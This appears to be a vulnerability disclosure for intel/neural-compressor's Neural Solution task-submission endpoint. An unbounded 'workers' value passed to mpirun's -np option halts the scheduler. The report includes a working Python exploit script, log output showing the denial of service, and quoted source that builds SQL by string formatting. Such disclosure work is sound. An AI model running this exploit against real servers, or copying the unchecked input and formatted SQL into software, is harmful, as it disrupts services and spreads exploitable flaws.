`intel / neural-compressor`'s `Neural Solution` -> `@app.post("/task/submit/")` remote endpoint allows user to submit `Task` for `effortlessly submit optimization tasks through the RESTful/gRPC APIs`. The `Task.workers` specifics the `-np` parameter of the `mpirun` optimization process. Nevertheless, despite sanitization at `neural_solution/frontend/utility.py` -> `is_valid_task`, `Task.workers` is still unlimited, resulting fail of allocating socket globally and halt of the whole `neural_solution/backend/scheduler.py` Task managing thread.

## Source-To-Sink

`neural-compressor/neural_solution/frontend/fastapi/main_server.py` -> `@app.post("/task/submit/")` defined the remote endpoint for `Neural Solution` Task Management, within this endpoint, user can specify their model and param for optimization in `Neural Solution`.

```python
@app.post("/task/submit/")
async def submit_task(task: Task):
    """Submit task.

    Args:
        task (Task): _description_
        Fields:
            task_id: The task id
            arguments: The task command
            workers: The requested resource unit number
            status: The status of the task: pending/running/done
            result: The result of the task, which is only value-assigned when the task is done

    Returns:
        json: status , id of task and messages.
    """
    if not is_valid_task(task.dict()):
        raise HTTPException(status_code=422, detail="Invalid task")

    msg = "Task submitted successfully"
    status = "successfully"
    # search the current
    db_path = get_db_path(config.workspace)

    if os.path.isfile(db_path):
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        task_id = str(uuid.uuid4()).replace("-", "")
        sql = (
            r"insert into task(id, script_url, optimized, arguments, approach, requirements, workers, status)"
            + r" values ('{}', '{}', {}, '{}', '{}', '{}', {}, 'pending')".format(
                task_id,
                task.script_url,
                task.optimized,
                list_to_string(task.arguments),
                task.approach,
                list_to_string(task.requirements),
                task.workers,
            )
        )
        cursor.execute(sql)
        conn.commit()

```

Sanitization against `task.workers` was implemented at `neural_solution/frontend/utility.py` -> `is_valid_task`, nevertheless failed to consider the amount of workers being parsed in:

```python
    if not isinstance(task["workers"], int) or task["workers"] < 1:
        return False
```

The `task.workers` will be parsed into `neural_solution/backend/scheduler.py` -> `_parse_cmd` directly as the `-np` specification of `mpicmd` (`-c|-np|--np <arg0> Number of processes to run`):

```python
  def _parse_cmd(self, task: Task, resource):
        # mpirun -np 3 -mca btl_tcp_if_include 192.168.20.0/24 -x OMP_NUM_THREADS=80
        # --host mlt-skx091,mlt-skx050,mlt-skx053 bash run_distributed_tuning.sh
        self.prepare_task(task)
        conda_env = self.prepare_env(task)
        host_str = ",".join([item.split(" ")[1] for item in resource])
        logger.info(f"[TaskScheduler] host resource: {host_str}")

        # Activate environment
        conda_bash_cmd = f"source {CONDA_SOURCE_PATH}"
        conda_env_cmd = f"conda activate {conda_env}"
        mpi_cmd = [
            "mpirun",
            "-np",
            "{}".format(task.workers),
            "-host",
            "{}".format(host_str),
            "-map-by",
            "socket:pe={}".format(self.num_threads_per_process),
            "-mca",
            "btl_tcp_if_include",
            "192.168.20.0/24",  # TODO replace it according to the node
            "-x",
            "OMP_NUM_THREADS={}".format(self.num_threads_per_process),
            "--report-bindings",
        ]
        mpi_cmd = " ".join(mpi_cmd)
```

which is executed at in `def launch_task(self, task: Task, resource):` via the `return full_cmd`

```python
 @dump_elapsed_time("Task execution")
    def launch_task(self, task: Task, resource):
        """Generate the mpi command and execute the task.

        Redirect the log to ./TASK_LOG_PATH/task_<id>/txt
        """
        full_cmd = self._parse_cmd(task, resource)
        logger.info(f"[TaskScheduler] Parsed the command from task: {full_cmd}")
        log_path = get_task_log_path(log_path=get_task_log_workspace(self.config.workspace), task_id=task.task_id)
        p = subprocess.Popen(full_cmd, stdout=open(log_path, "w+"), stderr=subprocess.STDOUT, shell=True)  # nosec
```

## Exploitation

1. Run `exploit.py` which parsed great amount of `workers`: `10000000000000000000000000000000000000000000` in our case
    
    ```python
    import requests
    import json
    
    def exploit(
        url = "http://localhost:8000"
    ):
        session = requests.Session()
        session.trust_env = False
    
        malicious_task = {
            "script_url": "https://github.com/huggingface/transformers/blob/v4.21-release/examples/pytorch/text-classification/run_glue.py",
            "optimized": "False",
            "arguments": [
                ""
            ],
            "approach": 'static',
            "requirements": [""],
            "workers": 10000000000000000000000000000000000000000000,
        }
        
        print(f"[*] Host = {url}\n")
    
        print("[!] Request: /task/submit/")
        response = session.post(url+'/task/submit/', data=json.dumps(malicious_task), headers={"Content-Type": "application/json"})
        print(response.content)
        
    exploit()
    ```
    
2. After the request is send, in `workspace/serve_log/backend.log` you can see the exception thrown indicating `no enough node resources!` and `task f3b7d8ef4d564e7ab038cd5e77c3da88 needs 1e+35` .....
    
    ```yaml
    2024-05-25 16:23:58 [INFO] task f3b7d8ef4d564e7ab038cd5e77c3da88 needs 1e+35
    2024-05-25 16:23:58 [INFO] Can not allocate 1e+35 sockets, due to only 5 left.
    2024-05-25 16:23:58 [INFO] [TaskScheduler] no enough node resources!
    2024-05-25 16:24:03 [INFO] [TaskScheduler 16:24:03] try to dispatch a task...
    ```
    
3. Run the `exploit.py` again with normal amount of `task.workers`, despite the http response is valid, the task will not be executed which the `backend.log` will kept throwing `Can not allocate 1e+35 sockets, due to only 5 left`.
    

# Impact

Denial-of-Service of the current components.